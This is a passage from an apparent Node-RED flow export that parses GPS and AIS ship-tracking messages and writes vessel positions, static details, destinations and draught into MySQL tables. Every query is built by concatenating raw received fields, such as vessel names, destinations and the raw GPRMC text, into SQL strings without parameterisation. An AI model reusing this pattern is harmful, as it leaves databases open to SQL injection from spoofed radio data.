        "func": "function convertLat(latitude,north_south){\n    var splitLat=latitude.split(\".\"),\n    secLat=splitLat[0].substring(splitLat[0].length - 2, splitLat[0].length)+'.'+splitLat[1],\n    degLat=splitLat[0].substring(0,splitLat[0].length - 2),\n    minLat=parseFloat(secLat)/60;\n    if(north_south=='S'){\n    \tnorth_south=-1;\n    }else{\n    \tnorth_south=1;\n    }\n    return String((parseFloat(degLat)+minLat)*north_south);\n}\n\nfunction convertLng(longitude,east_west){\n    var splitLng=longitude.split(\".\"),\n    secLng=splitLng[0].substring(splitLng[0].length - 2, splitLng[0].length)+'.'+splitLng[1],\n    degLng=splitLng[0].substring(0,splitLng[0].length - 2),\n    minLng=parseFloat(secLng)/60;\n    if(east_west=='W'){\n    \teast_west=-1;\n    }else{\n    \teast_west=1;\n    }\n    return String((parseFloat(degLng)+minLng)*east_west);\n}\n\nfunction fixDateTime(date_stamp,time_stamp){\n    var d = new Date(), date = date_stamp.substring(0,2), month = date_stamp.substring(2,4);\n    var fixDateStamp=String(d.getUTCFullYear())+'-'+month+'-'+date;\n    var fixTimeStamp=time_stamp.substring(0,2)+':'+time_stamp.substring(2,4)+':'+time_stamp.substring(4,6);\n    return String(fixDateStamp+' '+fixTimeStamp);\n}\n\n// var msgText=String(msg.payload);\nvar msgText=String(msg.gprmc);\nvar m=msgText.split(\",\");\nvar time_stamp=String(m[1]),validity=m[2],latitude=m[3],north_south=m[4],longitude=m[5],east_west=m[6],sog=m[7],cog=m[8],\ndate_stamp=String(m[9]),variation=m[10],fillbits=m[11];\n\nif(String(sog)!==''){\n    sog=String(parseFloat(sog));\n}else{\n    sog=\"0\";\n}\nif(String(cog)!==''){\n    cog=String(parseFloat(cog));\n}else{\n    cog=\"0\";\n}\nvar heading=cog;\nvar lat=convertLat(latitude,north_south);\nvar lng=convertLng(longitude,east_west);\nvar fixDT=fixDateTime(date_stamp,time_stamp);\n\nmsg.topic=\"INSERT INTO bst_mbs VALUES(0,\"+global.get('stationId')+\",\"+lat+\",\"+lng+\",\"+heading+\",\"+sog+\",\"+cog+\",'\"+fixDT+\"','\"+fixDT+\"')\";\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 480,
        "y": 40,
        "wires": [
            []
        ]
    },
    {
        "id": "c445113980fe905f",
        "type": "function",
        "z": "e289fbbf20048294",
        "name": "",
        "func": "var msgText=String(msg.payload);\nmsg.gprmc=msgText;\nmsg.topic=\"INSERT INTO gprmc_msg VALUES (0,'\"+msgText+\"',\"+global.get('stationId')+\",1,UTC_TIMESTAMP())\";\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 140,
        "y": 40,
        "wires": [
            []
        ]
    },
    {
        "id": "fb514815c057c516",
        "type": "debug",
        "z": "e289fbbf20048294",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 690,
        "y": 140,
        "wires": []
    },
    {
        "id": "9ef0951b169bd23a",
        "type": "debug",
        "z": "e289fbbf20048294",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "topic",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 420,
        "y": 140,
        "wires": []
    },
    {
        "id": "f771beaa6366218e",
        "type": "debug",
        "z": "e289fbbf20048294",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 140,
        "y": 220,
        "wires": []
    },
    {
        "id": "1a6641e497a014a8",
        "type": "function",
        "z": "eca4e1438e182dd7",
        "name": "",
        "func": "// var parsed={\"static\":{\"mmsi\":\"525019645\"},\"dynamic\":{\"station_id\":\"1\",\"sog\":0.3,\"cog\":15.6,\"bearing\":0,\"nav_status\":0,\"latitude\":-6.062245,\"longitude\":106.87224833333333,\"raim\":false,\"msg_type\":1,\"repeat_indicator\":0,\"position_accuracy\":0},\"destination\":{},\"draught\":{},\"ship_id\":0,\"time_stamp\":\"2020-10-01 10:27:50\",\"exists\":false};\nif(msg.parsed.ship_id===0){\n    msg.parsed.ship_id=msg.payload.insertId;\n}\nvar parsed=msg.parsed;\n\nObject.size = function(obj) {\n    var size = 0, key;\n    for (key in obj) {\n        if (obj.hasOwnProperty(key)) size++;\n    }\n    return size;\n};\n\nfunction addZero(i) {\n    if (i < 10) {\n      i = \"0\" + i;\n    }\n    return i;\n}\n\nvar dynamic=parsed.dynamic;\nvar destination=parsed.destination;\nvar draught=parsed.draught;\nvar dynamicSize = Object.size(dynamic);\nvar destinationSize = Object.size(destination);\nvar draughtSize = Object.size(draught);\n\nmsg.parsed.size={};\nmsg.parsed.size.dynamic=dynamicSize;\nmsg.parsed.size.destination=destinationSize;\nmsg.parsed.size.draught=draughtSize;\n\nvar d = new Date();\nvar suffix = String(d.getUTCFullYear())+String(addZero(d.getUTCMonth()+1));\nvar insertDynamic=\"INSERT INTO ais_dynamic_\"+suffix+\" set ship_id=\"+parsed.ship_id+\",\";\nvar updateDynamic=\"INSERT INTO ais_dynamic set ship_id=\"+parsed.ship_id+\",\";\nif(parsed.exists){\n    updateDynamic=\"UPDATE ais_dynamic set \";\n}\ni=1;\nObject.keys(dynamic).forEach(key => {\n\t// console.log(key, static[key]);\n    if(i>1){\n    \tinsertDynamic+=\",\";\n    \tupdateDynamic+=\",\";\n    }\n    var column = String(key);\n    var value = String(dynamic[key]);\n    if(value===\"undefined\"){\n        value=\"0\";\n    }\n    if(column===\"raim\"){\n        if(value===\"false\"){\n            value=\"0\";\n        }else{\n            value=\"1\";\n        }\n    }\n    if(column===\"latitude\" || column===\"longitude\"){\n        if(value!==\"0\" && value!==\"undefined\"){\n            insertDynamic+=column+\"='\"+value+\"'\";\n            updateDynamic+=column+\"='\"+value+\"'\";\n        }\n    }else{\n        insertDynamic+=column+\"='\"+value+\"'\";\n        updateDynamic+=column+\"='\"+value+\"'\";\n    }\n    i++;\n});\ninsertDynamic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\nif(!parsed.exists){\n    updateDynamic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\n}else{\n    updateDynamic+=\",updated_at=UTC_TIMESTAMP() WHERE ship_id=\"+parsed.ship_id;\n}\n\nmsg.insertDynamic=insertDynamic.replace(\",,,\", \",\");\nmsg.updateDynamic=updateDynamic.replace(\",,,\", \",\");\n\nvar insertDestination=0;\ni=1;\nif(destination.destination!==undefined){\n    var tempEta = destination.eta.toISOString().slice(0, 19).replace('T', ' ');\n    destination.eta = tempEta;\n    insertDestination=\"INSERT INTO ais_destination set ship_id=\"+parsed.ship_id+\",\";\n    Object.keys(destination).forEach(key => {\n    \t// console.log(key, static[key]);\n        if(i>1){\n        \tinsertDestination+=\",\";\n        }\n        var column = String(key);\n        var value = String(destination[key]);\n        // if(value===\"undefined\"){\n        //     value=\"0\";\n        // }\n        insertDestination+=column+\"='\"+value+\"'\";\n        i++;\n    });\n    insertDestination+=\",updated_at='\"+parsed.time_stamp+\"'\";\n    insertDestination=insertDestination.replace(\"\\\\\", \"\\\\\\\\\");\n}\nmsg.insertDestination=insertDestination;\n\nvar insertDraught=0;\ni=1;\nif(draught.draught!==undefined){\n    insertDraught=\"INSERT INTO ais_draught set ship_id=\"+parsed.ship_id+\",\";\n    Object.keys(draught).forEach(key => {\n    \t// console.log(key, static[key]);\n        if(i>1){\n        \tinsertDraught+=\",\";\n        }\n        var column = String(key);\n        var value = String(draught[key]);\n        // if(value===\"undefined\"){\n        //     value=\"0\";\n        // }\n        insertDraught+=column+\"='\"+value+\"'\";\n        i++;\n    });\n    insertDraught+=\",updated_at='\"+parsed.time_stamp+\"'\";\n}\nmsg.insertDraught=insertDraught;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 140,
        "y": 180,
        "wires": [
            [
                "6c4736d8e3c7761e"
            ]
        ]
    },
    {
        "id": "6c4736d8e3c7761e",
        "type": "change",
        "z": "eca4e1438e182dd7",
        "name": "insertDynamic",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDynamic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 340,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "a6748f98fc06e20a",
        "type": "change",
        "z": "eca4e1438e182dd7",
        "name": "updateDynamic",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "updateDynamic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 340,
        "y": 240,
        "wires": [
            []
        ]
    },
    {
        "id": "30e8f36993057461",
        "type": "change",
        "z": "eca4e1438e182dd7",
        "name": "insertDestination",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDestination",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 570,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "321747fd573d9b26",
        "type": "change",
        "z": "eca4e1438e182dd7",
        "name": "insertDraught",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDraught",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 540,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "4197f6bf1bf7f832",
        "type": "switch",
        "z": "eca4e1438e182dd7",
        "name": "checkDestination",
        "property": "insertDestination",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "num"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 350,
        "y": 300,
        "wires": [
            [
                "30e8f36993057461"
            ],
            [
                "2496eb8ba528220f"
            ]
        ]
    },
    {
        "id": "2496eb8ba528220f",
        "type": "switch",
        "z": "eca4e1438e182dd7",
        "name": "checkDraught",
        "property": "insertDraught",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "num"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 340,
        "y": 380,
        "wires": [
            [
                "321747fd573d9b26"
            ],
            []
        ]
    },
    {
        "id": "4e68b043819caa94",
        "type": "function",
        "z": "eca4e1438e182dd7",
        "name": "",
        "func": "var decoded=msg.payload;\nmsg.decoded=decoded;\nif(decoded!==undefined){\n    msg.sqlStatic=\"SELECT * from ais_static where mmsi='\"+msg.payload.senderMmsi+\"'\";\n    // msg.sqlDynamic=\"SELECT count() as total from ais_dynamic where mmsi='\"+msg.payload.senderMmsi+\"'\";\n}\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 560,
        "y": 60,
        "wires": [
            [
                "1cef356ce0f4641e"
            ]
        ]
    },
    {
        "id": "a270fb256184c9f8",
        "type": "switch",
        "z": "eca4e1438e182dd7",
        "name": "If !Undefined",
        "property": "payload",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "str"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 410,
        "y": 60,
        "wires": [
            [
                "4e68b043819caa94"
            ],
            []
        ]
    },
    {
        "id": "1cef356ce0f4641e",
        "type": "change",
        "z": "eca4e1438e182dd7",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "sqlStatic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 710,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "87cda4741e056a8e",
        "type": "function",
        "z": "eca4e1438e182dd7",
        "name": "",
        "func": "// if (msg.payload && !msg.payload.length){\n//     msg.result=\"No Data\";\n// }else{\n//     msg.result=msg.payload.length;\n// }\n// return msg;\n\nfunction addZero(i) {\n    if (i < 10) {\n      i = \"0\" + i;\n    }\n    return i;\n}\n\nvar isDataExists=true;\nvar ship_id=0;\nvar aisData={static:{},dynamic:{},destination:{},draught:{}};\n\nif (msg.payload && !msg.payload.length){\n    isDataExists=false;\n}\n\nvar d = new Date();\nvar time_stamp = String(d.getUTCFullYear())+'-'+String(addZero(d.getUTCMonth()+1))+'-'+String(addZero(d.getUTCDate()))+' ';\ntime_stamp += String(addZero(d.getUTCHours()))+':'+String(addZero(d.getUTCMinutes()))+':'+String(addZero(d.getUTCSeconds()));\n\n//Init Ship ID\nif(!isDataExists){\n    ship_id=0;\n}else{\n    ship_id=msg.payload[0].id;\n}\naisData.ship_id=ship_id;\n//Static Data\naisData.static.mmsi=msg.decoded.senderMmsi,\naisData.static.callsign=msg.decoded.callsign,\naisData.static.vessel_name=msg.decoded.name,\naisData.static.imo=msg.decoded.shipId,\naisData.static.ship_type=msg.decoded.shipType,\naisData.static.dimension_a=msg.decoded.dimensionToBow,\naisData.static.dimension_b=msg.decoded.dimensionToStern,\naisData.static.dimension_c=msg.decoded.dimensionToPort,\naisData.static.dimension_d=msg.decoded.dimensionToStarboard,\naisData.static.fix_type=msg.decoded.fix_type,\n//Dynamic Data\naisData.dynamic.station_id=global.get('stationId'),\naisData.dynamic.sog=msg.decoded.speedOverGround,\naisData.dynamic.cog=msg.decoded.courseOverGround,\naisData.dynamic.heading=msg.decoded.trueHeading,\naisData.dynamic.turning_direction=msg.decoded.turningDirection,\naisData.dynamic.rot=msg.decoded.turningRate,\naisData.dynamic.bearing=0,\naisData.dynamic.nav_status=msg.decoded.navigationStatus,\naisData.dynamic.latitude=msg.decoded.latitude,\naisData.dynamic.longitude=msg.decoded.longitude,\naisData.dynamic.raim=msg.decoded.raim,\naisData.dynamic.msg_type=msg.decoded.messageType,\naisData.dynamic.repeat_indicator=msg.decoded.repeatIndicator,\naisData.dynamic.position_accuracy=msg.decoded.positionAccuracy,\n//Destination\naisData.destination.destination=msg.decoded.destination,\naisData.destination.eta=msg.decoded.eta,\n//Draught\naisData.draught.draught=msg.decoded.draught;\n//Timestamp\naisData.time_stamp=time_stamp;\n//isExists?\naisData.exists=isDataExists;\n\nmsg.parsed=aisData;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 360,
        "y": 120,
        "wires": [
            [
                "93f49a6721b1b5d4"
            ]
        ]
    },
    {
        "id": "93f49a6721b1b5d4",
        "type": "function",
        "z": "eca4e1438e182dd7",
        "name": "",
        "func": "// var parsed={\"static\":{\"mmsi\":\"525019645\"},\"dynamic\":{\"station_id\":\"1\",\"sog\":0.3,\"cog\":15.6,\"bearing\":0,\"nav_status\":0,\"latitude\":-6.062245,\"longitude\":106.87224833333333,\"raim\":false,\"msg_type\":1,\"repeat_indicator\":0,\"position_accuracy\":0},\"destination\":{},\"draught\":{},\"ship_id\":0,\"time_stamp\":\"2020-10-01 10:27:50\",\"exists\":false};\nvar parsed=msg.parsed;\nObject.size = function(obj) {\n    var size = 0, key;\n    for (key in obj) {\n        if (obj.hasOwnProperty(key)) size++;\n    }\n    return size;\n};\nvar astatic=parsed.static;\nvar staticSize = Object.size(astatic);\n\nvar insertStatic;\nvar isUpdate=false;\nif(!parsed.exists){\n\tinsertStatic=\"INSERT INTO ais_static set \";\n}else{\n    insertStatic=\"UPDATE ais_static set \";\n    isUpdate=true;\n}\nvar i=1;\nObject.keys(astatic).forEach(key => {\n    // console.log(key, astatic[key]);\n    if(i>1){\n        insertStatic+=\",\";\n    }\n    var column = String(key);\n    var value = String(astatic[key]);\n    if(value===\"undefined\"){\n        value=0;\n        if(column==\"vessel_name\"){\n            value=\"\";\n        }else if(column==\"imo\"){\n            value=\"\";\n        }else if(column==\"callsign\"){\n            value=\"\";\n        }\n    }\n    insertStatic+=column+\"='\"+value+\"'\";\n    i++;\n});\n// console.log(insertStatic);\nif(isUpdate){\n    insertStatic+=\",updated_at=UTC_TIMESTAMP() WHERE id=\"+parsed.ship_id;\n}else{\n    insertStatic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\n}\nmsg.topic=insertStatic;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 500,
        "y": 120,
        "wires": [
            []
        ]
    },
    {
        "id": "d88793fc36d85047",
        "type": "function",
        "z": "eca4e1438e182dd7",
        "name": "",
        "func": "if(msg.payload===undefined){\n    msg.payload=0;\n}\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 260,
        "y": 60,
        "wires": [
            [
                "a270fb256184c9f8"
            ]
        ]
    },
    {
        "id": "3abb23c1f0a0febd",
        "type": "function",
        "z": "7270f4f520a7cbf6",
        "name": "",
        "func": "// var parsed={\"static\":{\"mmsi\":\"525019645\"},\"dynamic\":{\"station_id\":\"1\",\"sog\":0.3,\"cog\":15.6,\"bearing\":0,\"nav_status\":0,\"latitude\":-6.062245,\"longitude\":106.87224833333333,\"raim\":false,\"msg_type\":1,\"repeat_indicator\":0,\"position_accuracy\":0},\"destination\":{},\"draught\":{},\"ship_id\":0,\"time_stamp\":\"2020-10-01 10:27:50\",\"exists\":false};\nif(msg.parsed.ship_id===0){\n    msg.parsed.ship_id=msg.payload.insertId;\n}\nvar parsed=msg.parsed;\n\nObject.size = function(obj) {\n    var size = 0, key;\n    for (key in obj) {\n        if (obj.hasOwnProperty(key)) size++;\n    }\n    return size;\n};\n\nfunction addZero(i) {\n    if (i < 10) {\n      i = \"0\" + i;\n    }\n    return i;\n}\n\nvar dynamic=parsed.dynamic;\nvar destination=parsed.destination;\nvar draught=parsed.draught;\nvar dynamicSize = Object.size(dynamic);\nvar destinationSize = Object.size(destination);\nvar draughtSize = Object.size(draught);\n\nmsg.parsed.size={};\nmsg.parsed.size.dynamic=dynamicSize;\nmsg.parsed.size.destination=destinationSize;\nmsg.parsed.size.draught=draughtSize;\n\nvar d = new Date();\nvar suffix = String(d.getUTCFullYear())+String(addZero(d.getUTCMonth()+1));\nvar insertDynamic=\"INSERT INTO ais_dynamic_\"+suffix+\" set ship_id=\"+parsed.ship_id+\",\";\nvar updateDynamic=\"INSERT INTO ais_dynamic set ship_id=\"+parsed.ship_id+\",\";\nif(parsed.exists){\n    updateDynamic=\"UPDATE ais_dynamic set \";\n}\ni=1;\nObject.keys(dynamic).forEach(key => {\n\t// console.log(key, static[key]);\n    if(i>1){\n    \tinsertDynamic+=\",\";\n    \tupdateDynamic+=\",\";\n    }\n    var column = String(key);\n    var value = String(dynamic[key]);\n    if(value===\"undefined\"){\n        value=\"0\";\n    }\n    if(column===\"raim\"){\n        if(value===\"false\"){\n            value=\"0\";\n        }else{\n            value=\"1\";\n        }\n    }\n    if(column===\"latitude\" || column===\"longitude\"){\n        if(value!==\"0\" && value!==\"undefined\"){\n            insertDynamic+=column+\"='\"+value+\"'\";\n            updateDynamic+=column+\"='\"+value+\"'\";\n        }\n    }else{\n        insertDynamic+=column+\"='\"+value+\"'\";\n        updateDynamic+=column+\"='\"+value+\"'\";\n    }\n    i++;\n});\ninsertDynamic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\nif(!parsed.exists){\n    updateDynamic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\n}else{\n    updateDynamic+=\",updated_at=UTC_TIMESTAMP() WHERE ship_id=\"+parsed.ship_id;\n}\n\nmsg.insertDynamic=insertDynamic.replace(\",,,\", \",\");\nmsg.updateDynamic=updateDynamic.replace(\",,,\", \",\");\n\nvar insertDestination=0;\ni=1;\nif(destination.destination!==undefined){\n    var tempEta = destination.eta.toISOString().slice(0, 19).replace('T', ' ');\n    destination.eta = tempEta;\n    insertDestination=\"INSERT INTO ais_destination set ship_id=\"+parsed.ship_id+\",\";\n    Object.keys(destination).forEach(key => {\n    \t// console.log(key, static[key]);\n        if(i>1){\n        \tinsertDestination+=\",\";\n        }\n        var column = String(key);\n        var value = String(destination[key]);\n        // if(value===\"undefined\"){\n        //     value=\"0\";\n        // }\n        insertDestination+=column+\"='\"+value+\"'\";\n        i++;\n    });\n    insertDestination+=\",updated_at='\"+parsed.time_stamp+\"'\";\n    insertDestination=insertDestination.replace(\"\\\\\", \"\\\\\\\\\");\n}\nmsg.insertDestination=insertDestination;\n\nvar insertDraught=0;\ni=1;\nif(draught.draught!==undefined){\n    insertDraught=\"INSERT INTO ais_draught set ship_id=\"+parsed.ship_id+\",\";\n    Object.keys(draught).forEach(key => {\n    \t// console.log(key, static[key]);\n        if(i>1){\n        \tinsertDraught+=\",\";\n        }\n        var column = String(key);\n        var value = String(draught[key]);\n        // if(value===\"undefined\"){\n        //     value=\"0\";\n        // }\n        insertDraught+=column+\"='\"+value+\"'\";\n        i++;\n    });\n    insertDraught+=\",updated_at='\"+parsed.time_stamp+\"'\";\n}\nmsg.insertDraught=insertDraught;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 140,
        "y": 180,
        "wires": [
            [
                "050422190979b3da"
            ]
        ]
    },
    {
        "id": "050422190979b3da",
        "type": "change",
        "z": "7270f4f520a7cbf6",
        "name": "insertDynamic",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDynamic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 340,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "da872ddeedefef67",
        "type": "change",
        "z": "7270f4f520a7cbf6",
        "name": "updateDynamic",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "updateDynamic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 340,
        "y": 240,
        "wires": [
            []
        ]
    },
    {
        "id": "d275df9a0f52b09d",
        "type": "change",
        "z": "7270f4f520a7cbf6",
        "name": "insertDestination",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDestination",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 570,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "5c1aa696897d397f",
        "type": "change",
        "z": "7270f4f520a7cbf6",
        "name": "insertDraught",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDraught",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 540,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "384c06897a331bb9",
        "type": "switch",
        "z": "7270f4f520a7cbf6",
        "name": "checkDestination",
        "property": "insertDestination",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "num"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 350,
        "y": 300,
        "wires": [
            [
                "d275df9a0f52b09d"
            ],
            [
                "486c10e34ce5ff95"
            ]
        ]
    },
    {
        "id": "486c10e34ce5ff95",
        "type": "switch",
        "z": "7270f4f520a7cbf6",
        "name": "checkDraught",
        "property": "insertDraught",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "num"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 340,
        "y": 380,
        "wires": [
            [
                "5c1aa696897d397f"
            ],
            []
        ]
    },
    {
        "id": "ade9dc93f6b11538",
        "type": "function",
        "z": "7270f4f520a7cbf6",
        "name": "",
        "func": "var decoded=msg.payload;\nmsg.decoded=decoded;\nif(decoded!==undefined){\n    msg.sqlStatic=\"SELECT * from ais_static where mmsi='\"+msg.payload.senderMmsi+\"'\";\n    // msg.sqlDynamic=\"SELECT count() as total from ais_dynamic where mmsi='\"+msg.payload.senderMmsi+\"'\";\n}\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 560,
        "y": 60,
        "wires": [
            [
                "4db67fcf1b195eb6"
            ]
        ]
    },
    {
        "id": "d5b6f36327186200",
        "type": "switch",
        "z": "7270f4f520a7cbf6",
        "name": "If !Undefined",
        "property": "payload",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "str"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 410,
        "y": 60,
        "wires": [
            [
                "ade9dc93f6b11538"
            ],
            []
        ]
    },
    {
        "id": "4db67fcf1b195eb6",
        "type": "change",
        "z": "7270f4f520a7cbf6",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "sqlStatic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 710,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "182edca6f5062900",
        "type": "function",
        "z": "7270f4f520a7cbf6",
        "name": "",
        "func": "// if (msg.payload && !msg.payload.length){\n//     msg.result=\"No Data\";\n// }else{\n//     msg.result=msg.payload.length;\n// }\n// return msg;\n\nfunction addZero(i) {\n    if (i < 10) {\n      i = \"0\" + i;\n    }\n    return i;\n}\n\nvar isDataExists=true;\nvar ship_id=0;\nvar aisData={static:{},dynamic:{},destination:{},draught:{}};\n\nif (msg.payload && !msg.payload.length){\n    isDataExists=false;\n}\n\nvar d = new Date();\nvar time_stamp = String(d.getUTCFullYear())+'-'+String(addZero(d.getUTCMonth()+1))+'-'+String(addZero(d.getUTCDate()))+' ';\ntime_stamp += String(addZero(d.getUTCHours()))+':'+String(addZero(d.getUTCMinutes()))+':'+String(addZero(d.getUTCSeconds()));\n\n//Init Ship ID\nif(!isDataExists){\n    ship_id=0;\n}else{\n    ship_id=msg.payload[0].id;\n}\naisData.ship_id=ship_id;\n//Static Data\naisData.static.mmsi=msg.decoded.senderMmsi,\naisData.static.callsign=msg.decoded.callsign,\naisData.static.vessel_name=msg.decoded.name,\naisData.static.imo=msg.decoded.shipId,\naisData.static.ship_type=msg.decoded.shipType,\naisData.static.dimension_a=msg.decoded.dimensionToBow,\naisData.static.dimension_b=msg.decoded.dimensionToStern,\naisData.static.dimension_c=msg.decoded.dimensionToPort,\naisData.static.dimension_d=msg.decoded.dimensionToStarboard,\naisData.static.fix_type=msg.decoded.fix_type,\n//Dynamic Data\naisData.dynamic.station_id=global.get('stationId'),\naisData.dynamic.sog=msg.decoded.speedOverGround,\naisData.dynamic.cog=msg.decoded.courseOverGround,\naisData.dynamic.heading=msg.decoded.trueHeading,\naisData.dynamic.turning_direction=msg.decoded.turningDirection,\naisData.dynamic.rot=msg.decoded.turningRate,\naisData.dynamic.bearing=0,\naisData.dynamic.nav_status=msg.decoded.navigationStatus,\naisData.dynamic.latitude=msg.decoded.latitude,\naisData.dynamic.longitude=msg.decoded.longitude,\naisData.dynamic.raim=msg.decoded.raim,\naisData.dynamic.msg_type=msg.decoded.messageType,\naisData.dynamic.repeat_indicator=msg.decoded.repeatIndicator,\naisData.dynamic.position_accuracy=msg.decoded.positionAccuracy,\n//Destination\naisData.destination.destination=msg.decoded.destination,\naisData.destination.eta=msg.decoded.eta,\n//Draught\naisData.draught.draught=msg.decoded.draught;\n//Timestamp\naisData.time_stamp=time_stamp;\n//isExists?\naisData.exists=isDataExists;\n\nmsg.parsed=aisData;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 360,
        "y": 120,
        "wires": [
            [
                "fad94d18ad944a16"
            ]
        ]
    },
    {
        "id": "fad94d18ad944a16",
        "type": "function",
        "z": "7270f4f520a7cbf6",
        "name": "",
        "func": "// var parsed={\"static\":{\"mmsi\":\"525019645\"},\"dynamic\":{\"station_id\":\"1\",\"sog\":0.3,\"cog\":15.6,\"bearing\":0,\"nav_status\":0,\"latitude\":-6.062245,\"longitude\":106.87224833333333,\"raim\":false,\"msg_type\":1,\"repeat_indicator\":0,\"position_accuracy\":0},\"destination\":{},\"draught\":{},\"ship_id\":0,\"time_stamp\":\"2020-10-01 10:27:50\",\"exists\":false};\nvar parsed=msg.parsed;\nObject.size = function(obj) {\n    var size = 0, key;\n    for (key in obj) {\n        if (obj.hasOwnProperty(key)) size++;\n    }\n    return size;\n};\nvar astatic=parsed.static;\nvar staticSize = Object.size(astatic);\n\nvar insertStatic;\nvar isUpdate=false;\nif(!parsed.exists){\n\tinsertStatic=\"INSERT INTO ais_static set \";\n}else{\n    insertStatic=\"UPDATE ais_static set \";\n    isUpdate=true;\n}\nvar i=1;\nObject.keys(astatic).forEach(key => {\n    // console.log(key, astatic[key]);\n    if(i>1){\n        insertStatic+=\",\";\n    }\n    var column = String(key);\n    var value = String(astatic[key]);\n    if(value===\"undefined\"){\n        value=0;\n        if(column==\"vessel_name\"){\n            value=\"\";\n        }else if(column==\"imo\"){\n            value=\"\";\n        }else if(column==\"callsign\"){\n            value=\"\";\n        }\n    }\n    